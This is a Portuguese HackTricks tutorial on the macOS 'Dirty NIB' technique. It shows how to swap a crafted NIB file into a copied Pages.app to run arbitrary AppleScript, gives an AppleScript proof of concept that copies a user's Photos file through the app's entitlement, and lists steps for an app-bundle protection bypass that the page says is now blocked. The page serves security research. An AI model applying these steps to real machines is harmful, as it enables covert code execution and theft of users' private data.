# macOS Dirty NIB

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>

**Esta técnica foi retirada do post** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## Informações Básicas

Arquivos NIB são usados no ecossistema de desenvolvimento da Apple para **definir elementos da interface do usuário (UI)** e suas interações dentro de um aplicativo. Criados com a ferramenta Interface Builder, eles contêm **objetos serializados** como janelas, botões e campos de texto, que são carregados em tempo de execução para apresentar a UI projetada. Embora ainda em uso, a Apple tem recomendado a transição para Storyboards para uma representação mais visual do fluxo de UI de um aplicativo.

{% hint style="danger" %}
Além disso, **arquivos NIB** também podem ser usados para **executar comandos arbitrários** e se um arquivo NIB for modificado em um App, o **Gatekeeper ainda permitirá executar o app**, então eles podem ser usados para **executar comandos arbitrários dentro de aplicativos**.
{% endhint %}

## Injeção Dirty NIB <a href="#dirtynib" id="dirtynib"></a>

Primeiro precisamos criar um novo arquivo NIB, usaremos o XCode para a maior parte da construção. Começamos adicionando um Objeto à interface e definimos a classe para NSAppleScript:

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

Para o objeto, precisamos definir a propriedade `source` inicial, o que podemos fazer usando Atributos de Tempo de Execução Definidos pelo Usuário:

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

Isso configura nosso gadget de execução de código, que vai simplesmente **executar AppleScript sob solicitação**. Para realmente acionar a execução do AppleScript, vamos apenas adicionar um botão por enquanto (você pode, claro, ser criativo com isso ;). O botão será vinculado ao objeto `Apple Script` que acabamos de criar e irá **invocar o seletor `executeAndReturnError:`**:

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

Para testes, vamos apenas usar o Apple Script de:
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
E se executarmos isso no depurador do XCode e clicarmos no botão:

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

Com nossa capacidade de executar código AppleScript arbitrário a partir de um NIB, precisamos em seguida de um alvo. Vamos escolher o Pages para nossa demonstração inicial, que é claro, é um aplicativo da Apple e certamente não deveria ser modificável por nós.

Primeiro faremos uma cópia do aplicativo em `/tmp/`:
```bash
cp -a -X /Applications/Pages.app /tmp/
```
Então, lançaremos o aplicativo para evitar quaisquer problemas com o Gatekeeper e permitir que as coisas sejam armazenadas em cache:
```bash
open -W -g -j /Applications/Pages.app
```
Após iniciar (e encerrar) o aplicativo pela primeira vez, precisaremos substituir um arquivo NIB existente pelo nosso arquivo DirtyNIB. Para fins de demonstração, vamos simplesmente substituir o NIB do Painel Sobre para que possamos controlar a execução:
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
Uma vez que tenhamos sobrescrito o nib, podemos desencadear a execução selecionando o item de menu `About`:

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

Se olharmos mais de perto para o Pages, vemos que ele tem um entitlement privado que permite o acesso às Fotos do usuário:

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

Então, podemos colocar nosso POC à prova **modificando nosso AppleScript para roubar fotos** do usuário sem solicitação:

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**Exemplo de arquivo .xib malicioso que executa código arbitrário.**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## Crie seu próprio DirtyNIB



## Restrições de Lançamento

Elas basicamente **impedem a execução de aplicações fora de seus locais esperados**, então se você copiar uma aplicação protegida por Restrições de Lançamento para `/tmp`, você não conseguirá executá-la.\
[**Encontre mais informações neste post**](../macos-security-protections/#launch-constraints)**.**

No entanto, analisando o arquivo **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`** você ainda pode encontrar **aplicações que não estão protegidas por Restrições de Lançamento** e ainda pode **injetar** arquivos **NIB** em locais arbitrários **nessas** (verifique o link anterior para aprender como encontrar esses aplicativos).

## Proteções Extras

A partir do macOS Somona, existem algumas proteções **que impedem a escrita dentro de Apps**. No entanto, ainda é possível contornar essa proteção se, antes de executar sua cópia do binário, você mudar o nome da pasta Contents:

1. Faça uma cópia de `CarPlay Simulator.app` para `/tmp/`
2. Renomeie `/tmp/Carplay Simulator.app/Contents` para `/tmp/CarPlay Simulator.app/NotCon`
3. Execute o binário `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` para armazenar no cache do Gatekeeper
4. Substitua `NotCon/Resources/Base.lproj/MainMenu.nib` pelo nosso arquivo `Dirty.nib`
5. Renomeie para `/tmp/CarPlay Simulator.app/Contents`
6. Execute `CarPlay Simulator.app` novamente

{% hint style="success" %}
Parece que isso não é mais possível porque o macOS **impede a modificação de arquivos** dentro dos pacotes de aplicativos.\
Então, após executar o aplicativo para armazená-lo no cache do Gatekeeper, você não poderá modificar o pacote.\
E se você mudar, por exemplo, o nome do diretório Contents para **NotCon** (conforme indicado no exploit), e depois executar o binário principal do aplicativo para armazená-lo no cache do Gatekeeper, isso **disparará um erro e não executará**.
{% endhint %}

<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
